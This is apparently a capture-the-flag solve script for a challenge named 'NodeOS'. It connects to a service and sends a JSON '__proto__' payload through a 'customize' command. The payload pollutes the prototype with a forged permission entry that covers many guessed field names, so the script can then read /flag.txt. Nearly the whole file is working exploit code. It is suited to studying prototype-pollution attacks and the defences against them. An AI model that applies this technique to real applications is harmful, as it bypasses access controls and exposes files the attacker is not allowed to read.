#!/usr/bin/env python3
# solve.py — NodeOS: prototype pollution injects a permission-table entry for /flag.txt.
#
# usage: python solve.py <host> [port]
import json
import socket
import sys

HOST = sys.argv[1]
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
PROMPT = b"fm> "


def entry():
    """One 'kitchen sink' table entry: every plausible field name, by value family."""
    e = {}
    for k in ["owner", "ownerUid", "owner_uid", "ownerId", "owner_id", "uid", "user", "userId",
              "euid", "gid", "group", "egid", "id", "ownedBy", "owned_by", "o", "u"]:
        e[k] = 1000  # the default profile's uid
    for k in ["readable", "read", "r", "canRead", "can_read", "allowed", "allow", "public",
              "world", "open", "access", "accessible", "visible", "shared", "exists", "isFile",
              "file", "ok", "granted", "enabled", "everyone", "all", "any", "worldReadable",
              "world_readable", "isPublic", "readonly", "readOnly"]:
        e[k] = True
    for k in ["type", "kind", "t"]:
        e[k] = "file"
    for k in ["mode", "perm", "perms", "permissions", "permission", "bits", "rights",
              "access_mode", "acl"]:
        e[k] = "read"  # the deciding value
    for k in ["readers", "users", "uids", "allowedUids", "allowed_uids", "allowedUsers",
              "members", "owners", "whitelist", "allowlist", "groups", "allowed_users",
              "readableBy", "readable_by"]:
        e[k] = [1000]
    return e


def recv_until_prompt(s):
    buf = b""
    while not buf.endswith(PROMPT):
        chunk = s.recv(65536)
        if not chunk:
            raise EOFError(buf.decode(errors="replace"))
        buf += chunk
    return buf.decode(errors="replace")


def cmd(s, line):
    s.sendall(line.encode() + b"\n")
    out = recv_until_prompt(s).replace("\r", "")
    out = out.split("\n", 1)[1] if "\n" in out else out  # drop the pty echo of our input
    return out.rsplit("fm> ", 1)[0].strip()


def main():
    payload = json.dumps({"__proto__": {"/flag.txt": entry()}}, separators=(",", ":"))
    assert len(payload) < 4095, "the pty drops lines longer than 4095 bytes"
    s = socket.create_connection((HOST, PORT), timeout=10)
    recv_until_prompt(s)  # banner
    print(cmd(s, "customize " + payload))
    print(cmd(s, "read /flag.txt"))
    s.sendall(b"\x04")  # Ctrl-D: clean EOF; an abrupt close leaves a core dump on the instance
    s.close()


if __name__ == "__main__":
    main()
